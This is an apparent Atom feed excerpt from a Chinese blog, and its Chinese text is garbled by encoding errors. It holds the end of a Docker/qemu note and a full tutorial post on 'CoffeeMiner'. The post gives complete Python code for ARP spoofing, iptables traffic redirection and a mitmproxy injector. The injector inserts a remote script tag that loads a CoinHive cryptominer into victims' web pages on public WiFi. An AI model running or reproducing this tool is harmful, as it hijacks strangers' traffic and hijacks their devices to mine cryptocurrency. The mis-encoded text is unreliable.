&lt;figure class=&quot;highlight bash&quot;&gt;&lt;figcaption&gt;&lt;span&gt;post_checkout&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;curl -L https://github.com/balena-io/qemu/releases/download/v3.0.0%2Bresin/qemu-3.0.0+resin-arm.tar.gz | tar zxvf - -C . &amp;amp;&amp;amp; &lt;span class=&quot;built_in&quot;&gt;mv&lt;/span&gt; qemu-3.0.0+resin-arm/qemu-arm-static .&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;ç„¶ååœ¨Dockerfileé‡ŒåŠ å…¥ä¸€è¡Œ&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;COPY qemu-arm-static /usr/bin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;ç„¶è€Œå¹¶æ²¡æœ‰åµç”¨&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/categories/%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="æŠ˜è…¾é‚£äº›äº‹" scheme="https://thinkalone.win/tags/%E6%8A%98%E8%85%BE%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>CoffeeMinerï¼šåŠ«æŒWiFiç½‘ç»œæ¥å…¥è®¾å¤‡è¿›è¡Œâ€œæŒ–çŸ¿â€çš„æ¡†æ¶</title>
    <link href="https://thinkalone.win/CoffeeMiner.html"/>
    <id>https://thinkalone.win/CoffeeMiner.html</id>
    <published>2018-01-31T13:25:20.000Z</published>
    <updated>2018-01-31T13:25:20.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>å‡ ä¸ªæ˜ŸæœŸä»¥å‰ï¼Œæˆ‘çœ‹åˆ°äº†ç½‘ä¸Šå…³äºé»‘å®¢åŠ«æŒæ˜Ÿå·´å…‹WiFiç½‘ç»œä¸­çš„ç¬”è®°æœ¬ç”µè„‘è¿›è¡Œâ€œæŒ–çŸ¿â€çš„æŠ¥é“ï¼Œéå¸¸æœ‰æ„æ€ï¼Œç»“åˆåˆ†æï¼Œæˆ‘è®¤ä¸ºï¼Œè¿˜èƒ½ç”¨ä¸­é—´äººMITMæµ‹è¯•æ–¹å¼æ¥å®ç°ç±»ä¼¼ç›®çš„ã€‚æœ¬æ–‡ä¸­æˆ‘ä»¬å°±æ¥è®¨è®ºï¼Œå¦‚ä½•ä»¥MITMæ–¹å¼åœ¨htmlé¡µé¢ä¸­æ³¨å…¥javascriptï¼Œè®©é‚£äº›æ¥å…¥å…¬å…±WIFIçš„ç”µå­è®¾å¤‡æˆä¸ºé»‘å®¢æ‰‹ä¸­çš„â€œæŒ–çŸ¿â€çŸ¿å·¥ã€‚æœ€ç»ˆæˆ‘ä¼šç¼–å†™ä¸€ä¸ªå®é™…çš„è¢«ç§°ä¸ºâ€œCoffeeMinerâ€çš„è„šæœ¬ï¼Œå¯ä»¥ç”¨å®ƒæ¥åœ¨å’–å•¡åº—ç­‰å…¬å¼€WIFIç½‘ç»œç¯å¢ƒä¸­è¿›è¡ŒåŒ¿åæ¸—é€ï¼Œå®ç°æŒæ§å¤§é‡ç”µå­è®¾å¤‡å¼€å±•â€œæŒ–çŸ¿â€ç›®çš„ã€‚</strong></p><p><strong>æµ‹è¯•åœºæ™¯</strong></p><p>è¦åœ¨åœ¨ä¸€ä¸ªå…¬å¼€çš„WIFIç½‘ç»œç¯å¢ƒä¸­å®ç°è¯¥ç§ç›®çš„ï¼ŒCoffeeMineræµ‹è¯•è€…è¦è¯•å›¾æ‹¦æˆªç”¨æˆ·å’Œè·¯ç”±å™¨ä¹‹é—´çš„æµé‡ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š<br><img src="/pictures/CoffeeMiner/1.png"><br><strong>CoffeeMinerï¼šåŠ«æŒWiFiç½‘ç»œæ¥å…¥è®¾å¤‡è¿›è¡Œâ€œæŒ–çŸ¿â€çš„æ¶æ„æ¡†æ¶</strong></p><span id="more"></span><h2 id="åœºæ™¯è®¾ç½®"><a href="#åœºæ™¯è®¾ç½®" class="headerlink" title="åœºæ™¯è®¾ç½®"></a>åœºæ™¯è®¾ç½®</h2><p>çœŸå®åœºæ™¯ä¸­ï¼ŒWIFIç½‘ç»œä¸­æ¥å…¥äº†å„ç§æ™ºèƒ½æ‰‹æœºæˆ–å¹³æ¿ç”µè„‘ï¼Œä¸ºäº†æ–¹ä¾¿æ·±å…¥åˆ†æï¼Œæˆ‘ä»¬æ­å»ºäº†ä¸€ä¸ªè™šæ‹Ÿç½‘ç»œç¯å¢ƒè¿›è¡Œæµ‹è¯•ã€‚åœ¨æ­¤ä¼šç”¨åˆ°VirtualBoxå’Œå®‰è£…åœ¨å…¶ä¸­çš„Kali Linuxï¼Œæˆ‘ä»¬ä¼šå®‰è£…3ä¸ªè™šæ‹ŸæœºKaliç³»ç»Ÿï¼Œåˆ†åˆ«æ‰®æ¼”ä»¥ä¸‹è§’è‰²ï¼š</p><blockquote><p>å—å®³è€…ï¼šæ¥å…¥äº†WIFIè·¯ç”±å™¨å¹¶æµè§ˆäº†æŸäº›æ¶æ„é¡µé¢<br>æµ‹è¯•è€…ï¼šè¿è¡ŒCoffeeMinerå·¥å…·ï¼Œå‘èµ·MITMæµ‹è¯•</p></blockquote><p><strong>è·¯ç”±&#x2F;ç½‘å…³è®¾å¤‡ï¼šèµ·åˆ°æ™®é€šç½‘å…³ä½œç”¨</strong></p><p><img src="/pictures/CoffeeMiner/2.png"></p><p><strong>ä¸€æ—¦å‘èµ·æµ‹è¯•ï¼Œå®é™…åœºæ™¯åº”è¯¥æ˜¯è¿™æ ·çš„ï¼Œå³å—å®³è€…çš„ç½‘ç»œæµé‡è¦è¢«åŠ«æŒï¼š</strong></p><p><img src="/pictures/CoffeeMiner/3.png"></p><p>æˆ‘ä»¬åˆ†åˆ«å¯¹3å°è™šæ‹Ÿæœºè¿›è¡Œä»¥ä¸‹é…ç½®ï¼š</p><p><strong>å—å®³è€…</strong><br>ç½‘ç»œé€‚é…å™¨ï¼š</p><blockquote><p>eth0: Host-only Adapter<br>&#x2F;etc&#x2F;network&#x2F;interfaces:<br> <img src="/pictures/CoffeeMiner/4.png"></p></blockquote><p><strong>æµ‹è¯•è€…</strong><br>ç½‘ç»œé€‚é…å™¨ï¼š</p><blockquote><p>eth0: Host-only Adapter<br>&#x2F;etc&#x2F;network&#x2F;interfaces:<br><img src="/pictures/CoffeeMiner/5.png"></p></blockquote><p><strong>è·¯ç”±&#x2F;ç½‘å…³è®¾å¤‡</strong><br>ç½‘ç»œé€‚é…å™¨ï¼š</p><blockquote><p>eth0: Bridged Adapter<br>eth1: Host-only Adapter<br>&#x2F;etc&#x2F;network&#x2F;interfaces:<br><img src="/pictures/CoffeeMiner/6.png"></p></blockquote><h1 id="ç¼–å†™CoffeeMinerä»£ç "><a href="#ç¼–å†™CoffeeMinerä»£ç " class="headerlink" title="ç¼–å†™CoffeeMinerä»£ç "></a>ç¼–å†™CoffeeMinerä»£ç </h1><p><strong>ARP spoofingåŠŸèƒ½æ¨¡å—</strong><br>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬é‡‡ç”¨ARP spoofingæ¥å®ç°ä¸­é—´äººMITMæµ‹è¯•ï¼š</p><blockquote><p>åœ¨è®¡ç®—æœºç½‘ç»œä¸­ï¼ŒARPæ¬ºéª—ã€ARPç¼“å­˜ä¸­æ¯’æˆ–ARPè·¯ç”±æ¯’åŒ–éƒ½æ˜¯æµ‹è¯•è€…åœ¨å±€åŸŸç½‘ä¸­å‘é€å‡å†’ARPæ¶ˆæ¯çš„æŠ€æœ¯ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œå…¶ç›®æ ‡æ˜¯å°†æµ‹è¯•è€…çš„MACåœ°å€ä¸é»˜è®¤ç½‘å…³æˆ–å…¶å®ƒä¸»æœºçš„IPåœ°å€ç›¸å…³è”ï¼Œä»è€Œå¯å°†è¯¥IPåœ°å€ç›¸å…³çš„ä»»ä½•ç½‘ç»œé€šä¿¡æµé‡è½¬å‘åˆ°æµ‹è¯•è€…ç”µè„‘ï¼Œå®ç°æµé‡æ‹¦æˆªå’Œæ•°æ®çªƒå–ç­‰å¤šç§æ¶æ„ç›®çš„ã€‚</p></blockquote><p><strong>ä¸ºäº†å®ç°è¯¥åŠŸèƒ½ï¼Œæˆ‘ä»¬è¦ç”¨åˆ°arpspoofå’Œå—…æ¢å·¥å…·dsniffï¼š</strong><br><img src="/pictures/CoffeeMiner/7.png"></p><h2 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h2><p>mitmproxyæ˜¯ä¸€æ¬¾æµé‡åˆ†æå’Œç¼–è¾‘å·¥å…·ï¼Œå¯ä»¥ç”¨å®ƒæ¥å‘èµ·ä¸­é—´äººæµ‹è¯•MITMã€‚åœ¨æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ¥åœ¨htmlé¡µé¢ä¸­æ³¨å…¥javascriptè„šæœ¬ï¼Œå‡ºäºæ“ä½œç®€æ˜“ï¼Œæˆ‘ä»¬åªå‘htmlé¡µé¢ä¸­æ³¨å…¥ä¸€è¡Œä»£ç ï¼Œä¹‹åè¯¥è¡Œä»£ç å°±ä¼šè¿œç¨‹è°ƒç”¨æ‰§è¡Œç›¸åº”çš„javascriptæŒ–çŸ¿è„šæœ¬ã€‚è¯¥è¡Œæ³¨å…¥ä»£ç ä¸ºï¼š</p><pre><code>&lt;script src=&quot;http://httpserverIP:8000/script.js&quot;&gt;&lt;/script&gt;</code></pre><h2 id="Injector"><a href="#Injector" class="headerlink" title="Injector"></a>Injector</h2><p>ä¸€æ—¦æˆ‘ä»¬æˆªè·äº†å—å®³è€…çš„ç½‘ç»œæµé‡ä¹‹åï¼Œå°±å¯åœ¨å…¶ä¸­æ³¨å…¥æˆ‘ä»¬æ„é€ çš„è„šæœ¬ï¼Œä¸ºäº†å®ç°è„šæœ¬æ³¨å…¥ï¼Œæˆ‘ä»¬éœ€è¦ç”¨åˆ° mitmproxy API æ¥ç¼–å†™ç›¸åº”injectorä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> ctx, http</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Injector</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, path</span>):</span><br><span class="line">        <span class="variable language_">self</span>.path = path</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">response</span>(<span class="params">self, flow: http.HTTPFlow</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.path:</span><br><span class="line">            html = BeautifulSoup(flow.response.content, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="variable language_">self</span>.path)</span><br><span class="line">            <span class="built_in">print</span>(flow.response.headers[<span class="string">&quot;content-type&quot;</span>])</span><br><span class="line">            <span class="keyword">if</span> flow.response.headers[<span class="string">&quot;content-type&quot;</span>] == <span class="string">&#x27;text/html&#x27;</span>:</span><br><span class="line">                script = html.new_tag(</span><br><span class="line">                    <span class="string">&quot;script&quot;</span>,</span><br><span class="line">                    src=<span class="variable language_">self</span>.path,</span><br><span class="line">                    <span class="built_in">type</span>=<span class="string">&#x27;application/javascript&#x27;</span>)</span><br><span class="line">                html.body.insert(<span class="number">0</span>, script)</span><br><span class="line">                flow.response.content = <span class="built_in">str</span>(html).encode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Script injected.&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;path&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"><span class="keyword">return</span> Injector(args.path)</span><br></pre></td></tr></table></figure><h2 id="HTTP-Server"><a href="#HTTP-Server" class="headerlink" title="HTTP Server"></a>HTTP Server</h2><p>å¦‚å‰æ‰€è¿°ï¼Œå½“injectorå‘htmlé¡µé¢ä¸­æ·»åŠ äº†ä¸€è¡Œä»£ç åï¼Œå°±ä¼šè°ƒç”¨JavaScriptæŒ–çŸ¿è„šæœ¬ï¼Œæ‰€ä»¥ï¼Œéœ€è¦åœ¨HTTPæœåŠ¡å™¨ä¸­éƒ¨ç½²è¯¥è„šæœ¬æ–‡ä»¶ã€‚è€Œä¸ºäº†å®ç°è¯¥è„šæœ¬çš„è¯·æ±‚è°ƒç”¨ï¼Œé¡»åœ¨æµ‹è¯•è€…ç”µè„‘ä¸­éƒ¨ç½²ä¸€ä¸ªHTTPæœåŠ¡å™¨ï¼Œä¸ºæ­¤ï¼Œæˆ‘ä»¬è¦ç”¨åˆ°Pythonçš„â€˜http.serverâ€™åº“åŠŸèƒ½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> http.server</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">PORT = <span class="number">8000</span></span><br><span class="line">web_dir = os.path.join(os.path.dirname(__file__), <span class="string">&#x27;miner_script&#x27;</span>)</span><br><span class="line">os.chdir(web_dir)</span><br><span class="line">Handler = http.server.SimpleHTTPRequestHandler</span><br><span class="line">httpd = socketserver.TCPServer((<span class="string">&quot;&quot;</span>, PORT), Handler)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;serving at port&quot;</span>, PORT)</span><br><span class="line">httpd.serve_forever()</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç å°±æ˜¯ä¸€ä¸ªæ‰˜ç®¡æŒ–çŸ¿æœåŠ¡çš„ç®€å•HTTPæœåŠ¡å™¨ï¼Œå…¶ä¸­æ‰˜ç®¡è„šæœ¬ä¼šè¢«æ”¾ç½®åœ¨&#x2F;miner_scriptç›®å½•ä¸‹ï¼Œä¸ºäº†å®ç°çœŸæ­£çš„æŒ–çŸ¿ï¼Œæˆ‘åœ¨æ­¤ä½¿ç”¨äº†CoinHiveçš„JavaScriptæŒ–çŸ¿å¹³å°å·¥å…·ã€‚</p><p><strong>CoinHiveæŒ–çŸ¿å·¥å…·</strong><br>Coinhiveå…¶å®æ˜¯ä¸€ä¸ªé—¨ç½—å¸æŒ–çŸ¿å·¥å…·ï¼Œå®ƒå¯ä»¥åµŒå…¥è¢«æµ‹è¯•è€…æ§åˆ¶çš„è‚‰é¸¡ç½‘ç«™ä¸Šï¼Œæ¯å½“ç”¨æˆ·è®¿é—®è¯¥ç½‘ç«™æ—¶ï¼Œç”¨æˆ·CPUèµ„æºå°±ä¼šè¢«å ç”¨ï¼Œç”¨æ¥è®¡ç®—CryptoNoteåè®®ç›¸å…³çš„åŠ å¯†è´§å¸å“ˆå¸Œå€¼ï¼Œç”¨æˆ·ç”µè„‘ä¹Ÿå°±é—´æ¥æ²¦ä¸ºäº†æµ‹è¯•è€…çš„â€œçŸ¿å·¥â€ã€‚</p><p>CoinhiveæŒ–çŸ¿å·¥å…·çš„æ‰§è¡Œï¼Œè¦åœ¨å—å®³è€…æ‰“å¼€é¡µé¢40ç§’åæ‰èƒ½å¼€å§‹ï¼Œæ‰€ä»¥ï¼Œå¦‚æœå—å®³è€…æµè§ˆé¡µé¢æ—¶é—´ä¸è¶³40ç§’ï¼ŒCoinhiveçš„æŒ–çŸ¿ä»»åŠ¡å¤±æ•ˆã€‚æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä¼šåœ¨å—å®³è€…è¯·æ±‚çš„æ¯ä¸ªhtmlé¡µé¢ä¸­æ³¨å…¥æŒ–çŸ¿è„šæœ¬ï¼Œæ‰€ä»¥æ—¶é—´ä¸Šè‚¯å®šè¶³å¤Ÿã€‚<br><img src="/pictures/CoffeeMiner/8.jpg"></p><h2 id="CoffeeMinerä»£ç ç»„åˆ"><a href="#CoffeeMinerä»£ç ç»„åˆ" class="headerlink" title="CoffeeMinerä»£ç ç»„åˆ"></a>CoffeeMinerä»£ç ç»„åˆ</h2><p>ç­‰æ‰€æœ‰æ¡ä»¶å‡†å¤‡å¥½ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨æŸä¸ªWIFIç¯å¢ƒä¸­è¿›è¡Œéšè”½éƒ¨ç½²äº†ï¼Œç°åœ¨æˆ‘ä»¬æ¥çœ‹çœ‹CoffeeMinerçš„å®ç°ã€‚<br>CoffeeMinerè„šæœ¬ä¼šæ‰§è¡ŒARPæ¬ºéª—ï¼Œå¹¶èƒ½ç”¨mitmproxyå°†CoinHive æŒ–çŸ¿ç¨‹åºæ³¨å…¥å—å®³è€…è¯·æ±‚çš„htmlé¡µé¢ä¸­ã€‚<br>é¦–å…ˆï¼Œä¸ºäº†æŠŠæµ‹è¯•è€…ä¸»æœºè½¬åŒ–ä¸ºä¸­é—´ä»£ç†ï¼Œéœ€è¦å¯¹ip_forwardingå’ŒIPTABLESè¿›è¡Œé…ç½®ï¼š</p><p><img src="/pictures/CoffeeMiner/9.png"></p><p>ä¸ºäº†å¯¹æ‰€æœ‰å—å®³è€…æ‰§è¡ŒARPæ¬ºéª—ï¼Œæˆ‘ä¼šä½¿ç”¨ä¸€äº›Pythonä»£ç æ¥è¯»å–æ‰€æœ‰å—å®³è€…IPï¼Œå¹¶ç”¨ä¸€ä¸ªåä¸ºâ€˜victims.txtâ€™çš„æ–‡ä»¶æ¥å­˜å‚¨è¿™äº›IPï¼Œä¹‹åå†å¯¹è¿™äº›IPæ‰§è¡ŒARPæ¬ºéª—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get gateway_ip</span></span><br><span class="line">gateway = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gateway: &quot;</span> + gateway)</span><br><span class="line"><span class="comment">#get victims_ip</span></span><br><span class="line">victims = [line.rstrip(<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;victims.txt&quot;</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;victims:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(victims)</span><br><span class="line"><span class="comment">#run the arpspoof for each victim, each one in a new console</span></span><br><span class="line"><span class="keyword">for</span> victim <span class="keyword">in</span> victims:</span><br><span class="line">    os.system(<span class="string">&quot;xterm -e arpspoof -i eth0 -t &quot;</span> + victim + <span class="string">&quot; &quot;</span> + gateway + <span class="string">&quot; &amp;&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;xterm -e arpspoof -i eth0 -t &quot;</span> + gateway + <span class="string">&quot; &quot;</span> + victim + <span class="string">&quot; &amp;&quot;</span>)</span><br></pre></td></tr></table></figure><p>ä¸€æ—¦ARPæ¬ºéª—æ“ä½œå‘èµ·åï¼Œè¿è¡ŒHTTPæœåŠ¡å™¨å³å¯ï¼š</p><blockquote><p>python3 httpServer.py</p></blockquote><p>ä¹‹åï¼Œå°±å¯åˆ©ç”¨mitmproxyæ¥æ‰§è¡Œæ³¨å…¥ç¨‹åº injector.pyï¼š</p><blockquote><p>mitmdump -s â€˜injector.py <a href="http://httpserverip:8000/script.js">http://httpserverIP:8000/script.js</a>â€˜</p></blockquote><h2 id="æœ€ç»ˆè„šæœ¬"><a href="#æœ€ç»ˆè„šæœ¬" class="headerlink" title="æœ€ç»ˆè„šæœ¬"></a>æœ€ç»ˆè„šæœ¬</h2><figure class="highlight python"><figcaption><span>coffeeMiner.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#get gateway_ip (router)</span></span><br><span class="line">gateway = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gateway: &quot;</span> + gateway)</span><br><span class="line"><span class="comment">#get victims_ip</span></span><br><span class="line">victims = [line.rstrip(<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;victims.txt&quot;</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;victims:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(victims)</span><br><span class="line"><span class="comment">#configure routing (IPTABLES)</span></span><br><span class="line">os.system(<span class="string">&quot;echo 1 &gt; /proc/sys/net/ipv4/ip_forward&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080&quot;</span>)</span><br><span class="line"><span class="comment">#run the arpspoof for each victim, each one in a new console</span></span><br><span class="line"><span class="keyword">for</span> victim <span class="keyword">in</span> victims:</span><br><span class="line">    os.system(<span class="string">&quot;xterm -e arpspoof -i eth0 -t &quot;</span> + victim + <span class="string">&quot; &quot;</span> + gateway + <span class="string">&quot; &amp;&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;xterm -e arpspoof -i eth0 -t &quot;</span> + gateway + <span class="string">&quot; &quot;</span> + victim + <span class="string">&quot; &amp;&quot;</span>)</span><br><span class="line"><span class="comment">#start the http server for serving the script.js, in a new console</span></span><br><span class="line">os.system(<span class="string">&quot;xterm -hold -e &#x27;python3 httpServer.py&#x27; &amp;&quot;</span>)</span><br><span class="line"><span class="comment">#start the mitmproxy</span></span><br><span class="line">os.system(<span class="string">&quot;~/.local/bin/mitmdump -s &#x27;injector.py http://10.0.2.20:8000/script.js&#x27; -T&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><figcaption><span>injector.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> ctx, http</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Injector</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, path</span>):</span><br><span class="line">        <span class="variable language_">self</span>.path = path</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">response</span>(<span class="params">self, flow: http.HTTPFlow</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.path:</span><br><span class="line">            html = BeautifulSoup(flow.response.content, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="variable language_">self</span>.path)</span><br><span class="line">            <span class="built_in">print</span>(flow.response.headers[<span class="string">&quot;content-type&quot;</span>])</span><br><span class="line">            <span class="keyword">if</span> flow.response.headers[<span class="string">&quot;content-type&quot;</span>] == <span class="string">&#x27;text/html&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(flow.response.headers[<span class="string">&quot;content-type&quot;</span>])</span><br><span class="line">                script = html.new_tag(</span><br><span class="line">                    <span class="string">&quot;script&quot;</span>,</span><br><span class="line">                    src=<span class="variable language_">self</span>.path,</span><br><span class="line">                    <span class="built_in">type</span>=<span class="string">&#x27;application/javascript&#x27;</span>)</span><br><span class="line">                html.body.insert(<span class="number">0</span>, script)</span><br><span class="line">                flow.response.content = <span class="built_in">str</span>(html).encode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Script injected.&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;path&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">return</span> Injector(args.path)</span><br></pre></td></tr></table></figure><h2 id="æµ‹è¯•æ‰§è¡Œæ“ä½œï¼š"><a href="#æµ‹è¯•æ‰§è¡Œæ“ä½œï¼š" class="headerlink" title="æµ‹è¯•æ‰§è¡Œæ“ä½œï¼š"></a>æµ‹è¯•æ‰§è¡Œæ“ä½œï¼š</h2><blockquote><p>python3 coffeeMiner.py RouterIP</p></blockquote><h2 id="æµ‹è¯•æ¼”ç¤º"><a href="#æµ‹è¯•æ¼”ç¤º" class="headerlink" title="æµ‹è¯•æ¼”ç¤º"></a>æµ‹è¯•æ¼”ç¤º</h2><p>æˆ‘ä»¬åœ¨è™šæ‹Ÿæœºç¯å¢ƒä¸‹è¿›è¡Œæ¼”ç¤ºï¼Œå…ˆæ¥åœ¨ç»ˆç«¯ä¸­è¿›è¡Œæ‰‹åŠ¨æµ‹è¯•ï¼š</p><p><img src="/pictures/CoffeeMiner/10.png"></p><p>ARPæ¬ºéª—æ‰§è¡Œä¹‹åï¼Œinjectoræ³¨å…¥ç¨‹åºå’ŒHTTPæœåŠ¡å™¨å°±ç»ªï¼Œä¸€æ—¦å—å®³è€…è®¿é—®äº†æ¶æ„ç½‘é¡µä¹‹åï¼Œå…¶æ‰€æœ‰ç½‘ç»œæµé‡å°†ä¼šè½¬å‘åˆ°æµ‹è¯•è€…ä¸»æœºï¼Œå¹¶è§¦å‘æ³¨å…¥ï¼š</p><p><img src="/pictures/CoffeeMiner/11.png"></p><p>å› æ­¤ï¼Œå—å®³è€…æµè§ˆçš„é¡µé¢å°†è¢«æ³¨å…¥æ¶æ„æŒ–çŸ¿æœåŠ¡è°ƒç”¨ä»£ç ï¼š</p><p><img src="/pictures/CoffeeMiner/12.gif"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" 